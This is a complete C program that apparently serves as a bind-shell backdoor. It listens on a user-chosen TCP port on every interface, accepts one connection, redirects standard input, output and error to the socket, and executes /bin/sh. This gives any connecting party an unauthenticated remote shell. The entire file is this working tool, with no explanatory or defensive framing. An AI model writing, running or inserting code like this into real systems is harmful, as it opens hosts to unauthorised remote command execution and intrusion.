#include <sys/types.h>
#include <sys/socket.h>

#include <arpa/inet.h>

#include <err.h>
#include <errno.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>

int
main(int argc, char **argv)
{
	char			*exec_argv[] = { "/bin/sh", NULL };
	char			*endptr;
	int			 fd, fd_client, yes = 1;
	long			 port;
	socklen_t		 sl_client;
	struct sockaddr_in	 sa;
	struct sockaddr_storage	 sa_client;

	if (argc == 1)
		errx(1, "usage: port");

	errno = 0;
	port = strtol(argv[1], &endptr, 10);
	if (*endptr != '\0')
		errx(1, "not a number");
	if (errno == ERANGE || (port <= 1024 || port >= 65536))
		errx(1, "port out of range");

	if ((fd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
		err(1, "socket");

	bzero(&sa, sizeof sa);
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = htonl(INADDR_ANY);
	sa.sin_port = htons(port);

	if (bind(fd, (struct sockaddr *) &sa, sizeof sa) == -1)
		err(1, "bind");
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof yes) == -1)
		err(1, "setsockopt");
	if (listen(fd, 5) == -1)
		err(1, "listen");

	sl_client = sizeof sa_client; 
	fd_client = accept(fd, (struct sockaddr *) &sa_client, &sl_client);
	if (fd_client == -1)
		err(1, "accept");

	if (dup2(fd_client, STDIN_FILENO) == -1)
		err(1, "dup2");
	if (dup2(fd_client, STDOUT_FILENO) == -1)
		err(1, "dup2");
	if (dup2(fd_client, STDERR_FILENO) == -1)
		err(1, "dup2");

	execve(exec_argv[0], exec_argv, NULL);
	err(1, "execve");

	return (0);	/* NOTREACHED */
}
